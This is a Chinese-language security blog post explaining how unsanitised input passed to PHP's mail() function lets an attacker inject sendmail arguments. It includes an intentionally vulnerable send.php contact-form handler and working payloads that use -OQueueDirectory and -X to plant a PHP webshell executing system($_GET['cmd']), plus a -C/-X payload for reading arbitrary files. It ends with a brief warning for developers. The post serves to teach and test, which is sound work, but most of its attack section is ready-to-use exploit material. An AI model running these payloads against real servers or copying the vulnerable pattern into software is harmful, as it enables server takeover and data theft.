#  PHP mail() 命令注入到远程代码执行（RCE）  
haidragon
                    haidragon  安全狗的自我修养   2026-02-09 04:20  
  
# 官网：http://securitytech.cc  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/R98u9GTbBnvYtbLXtNXPmPFdYb7PYR1GTjwaFkKabKtuTR8A1yDHNw0LybSQcnyA5C4Qjo11HCvibfiaj0JvWQDxia8Ybic67R01Y7MuXGRWxIs/640?wx_fmt=jpeg&from=appmsg "")  
## 1）什么是 mail() 函数？  
  
PHP 是最常用的服务端脚本语言之一，用于构建动态 Web 应用。  
理解哪些内置函数可能引入安全风险，在安全测试与利用过程中能给攻击者带来巨大优势。  
  
特别是那些直接与操作系统交互、或执行外部二进制程序的函数，如果使用不当，往往会导致命令执行漏洞。其中一个典型函数就是 mail()  
。  
  
在动态 Web 应用中，联系表单非常常见，用于让用户与管理员沟通。许多 PHP 网站使用 mail()  
 函数来处理这些邮件提交。  
  
虽然这种方式简单方便，但如果使用不安全，就会引入严重漏洞。尤其是当未经过滤的用户输入被传入 mail()  
 的某些参数时，可能导致命令注入、任意文件操作，甚至远程代码执行（RCE）。  
  
因此，mail()  
 绝不能被认为是无害的函数，必须谨慎使用。  
  
Press enter or click to view image in full size  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/R98u9GTbBnsjDciath871MANl4myToEnziaUwxVrqhEHIoSFoq4PON0hkfOCfmYJqaEW4jpobMploaejiaiaRJ4nOGRjVfVmrdiaSw8ptJNpFBSE/640?wx_fmt=jpeg&from=appmsg "")  
  
从上面的输出可以看到，$to  
、$subject  
 和 $message  
 是必须参数。  
  
典型用法如下：  
```
mail($to, $subject, $message, $additional_headers, $additional_parameters);

```  
  
前三个参数分别表示收件人、主题和正文，后两个是可选参数，用于指定额外头信息以及传递给底层邮件代理（如 sendmail）的命令行参数。  
  
接下来创建一个简单联系表单，用来理解实际工作方式，再进入安全影响与利用场景。  
## index.php 内容  
  
下面是 index.php  
 的内容。  
  
该页面实现了一个简单联系表单，收集姓名、邮箱、主题和消息，并通过 POST 提交给 send.php  
。  
```
<!-- index.php -->
<formaction="send.php"method="post"></form>

```  
  
这个表单的目的很简单：收集用户数据并转发到后端脚本，后端使用 mail()  
 发送邮件。  
  
在这一阶段，程序行为和大多数 PHP 网站一样。但后面会看到，直接把用户输入传给 mail()  
 会带来严重风险。  
  
Press enter or click to view image in full size  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/R98u9GTbBnv5S8BdNzVfPr8bTcZVUDEthI03HmRuRb6uhU9dd3MH8azsaaWof7Toiad7VW8tMWIJLAZgoTRicUDfMRm0ARA08mNyktOoWNpxo/640?wx_fmt=jpeg&from=appmsg "")  
## send.php 内容  
  
下面是 send.php  
 文件，用来处理表单并调用 mail()  
。  
```
<?php
$name    = $_POST['ad'];
$sender  = $_POST['eposta'];
$body    = $_POST['mesaj'];
$to      = "ozan@bughaneacademy.com";
$subject = $_POST['konu'];
$headers = "From: NullSecurityX";mail($to, $subject, $body, $headers, "-f $sender ");
?>

```  
  
脚本从 POST 中取用户输入，直接传入 mail()  
。  
  
乍一看很正常，但这里存在一个严重问题。  
  
mail()  
 的最后一个参数 $additional_parameters  
 会被传给底层邮件代理（如 sendmail）。这里的 -f  
 参数是使用用户输入 $sender  
 拼接的。  
  
如果没有校验或过滤，攻击者就可以注入额外 sendmail 参数，从而导致命令注入、任意文件写入，甚至 RCE。  
  
本质上就是：**用户数据直接进入系统级二进制程序。**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/R98u9GTbBnv7vYykCgpZh41I2Wv8PKgcUzMxOEazA28DGm5uGtOHFSpOtxJBYDP3zCeWnib46dWLCuCP17Pqqg7csVzYW46MTs3CPk5tQc64/640?wx_fmt=jpeg&from=appmsg "")  
## 基本行为  
  
基于 index.php  
 的输入，程序会向 ozan@bughaneacademy.com  
 发送邮件。  
  
表面上这只是普通联系表单行为。  
## 3）漏洞从哪里来？  
  
mail()  
 有两个可选参数。  
  
最后一个 $additional_parameters  
 就是漏洞根源。  
  
它允许你把额外参数传给底层邮件代理。  
  
常见有：  
```
-C  → 指定配置文件
-O  → 覆盖内部选项
-X  → 写日志到文件

```  
  
这些不是 PHP 的参数，而是 **sendmail 参数**  
。  
  
PHP 的 mail()  
 内部实际执行 sendmail，因此 $additional_parameters  
 会被拼到命令行。  
  
这等价于给了一个“命令执行原语”。  
  
如果攻击者可控这个参数，就可能导致：  
- 任意文件读取  
  
- 任意文件写入  
  
- 命令注入  
  
- 远程代码执行  
  
## 4）通过 mail() 实现 RCE  
  
sendmail 的 -X  
 参数可以把日志写入指定文件。  
  
如果我们把输出文件设为 .php  
，并在正文中注入 PHP 代码，就可以生成 WebShell。  
  
在邮箱字段输入：  
```
hacker@bughaneacademy.com -OQueueDirectory=/var/www/html/mailrce/ -X/var/www/html/mailrce/shell.php

```  
  
正文写入：  
```
<?phpsystem($_GET["cmd"]); ?>

```  
  
然后访问：  
```
http://target/mailrce/shell.php?cmd=id

```  
  
即可执行系统命令。  
  
Press enter or click to view image in full size  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/R98u9GTbBntPoNVIb3HI0Zc2lxd4HfeZ4EDB7Yy3xyyJ6CzREqtUp3ibWBLrX7lzeRGMFb52d732e7YOLxoHib6RE6WQiaHHjzd8MlbP3Y7Ch4/640?wx_fmt=jpeg&from=appmsg "")  
  
shell.php  
 被作为日志创建，同时包含我们的 PHP 代码，于是变成 WebShell。  
  
Press enter or click to view image in full size  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/R98u9GTbBnvwjVyqR9KKq6W4AMeBBaAD6Gwt9gFZQh4qTlYHdcaOzZySSf5v47myiciapOksjfFMrWjGMsSib3ahCctLfF7Q0pMo8I6ichN34N4/640?wx_fmt=jpeg&from=appmsg "")  
## 5）通过 mail() 实现任意文件读取  
  
-C  
 参数可以指定 sendmail 配置文件。  
  
我们可以传任意文件路径，让 sendmail 解析，然后配合 -X  
 把输出写入 Web 可访问目录。  
  
Payload：  
```
ozan@bughaneacademy.com -C/var/www/html/mailrce/config.php -OQueueDirectory=/var/www/html/mailrce/ -X/var/www/html/mail/read.txt

```  
  
访问：  
```
http://target/mail/read.txt

```  
  
即可读取目标文件内容。  
  
Press enter or click to view image in full size  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/R98u9GTbBntBC5giauAyTHMZpA9ajDUylYJYqyBxfIP9icGFU5Yw0moTdLggiaQpibicgCRmlib8EcweGq4hLRLKaQKVIpTMGTLUWL5jZZj1FiczeU/640?wx_fmt=jpeg&from=appmsg "")  
## 总结  
  
这个例子说明：**一个被忽视的参数，就足以完全控制服务器。**  
  
通过操控 sendmail 参数，一个普通联系表单被升级成完整 RCE。  
  
真实环境中，严重漏洞往往来自这种微小配置错误。  
  
不要盲目信任 mail()  
，任何系统级调用都应当被视为潜在命令执行入口。  
- 公众号:安全狗的自我修养  
  
- vx:2207344074  
  
- http://  
gitee.com/haidragon  
  
- http://  
github.com/haidragon  
  
- bilibili:haidragonx  
  
##   
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/vBZcZNVQERGMBGbdxsdiaj8ZUicr210FQ092YpsgXmyaqwxqPcvPlLaxq84Ndm9Anx4IKy9ibuvaC5s4HFrpTw1ew/640?wx_fmt=other&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=15 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/vBZcZNVQERHYgfyicoHWcBVxH85UOBNaPZeRlpCaIfwnM0IM4vnVugkAyDFJlhe1Rkalbz0a282U9iaVU12iaEiahw/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&randomid=z84f6pb5&tp=webp#imgIndex=5 "")  
  
****- ![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/vBZcZNVQERHYgfyicoHWcBVxH85UOBNaPMJPjIWnCTP3EjrhOXhJsryIkR34mCwqetPF7aRmbhnxBbiaicS0rwu6w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&randomid=omk5zkfc&tp=webp#imgIndex=5 "")  
  
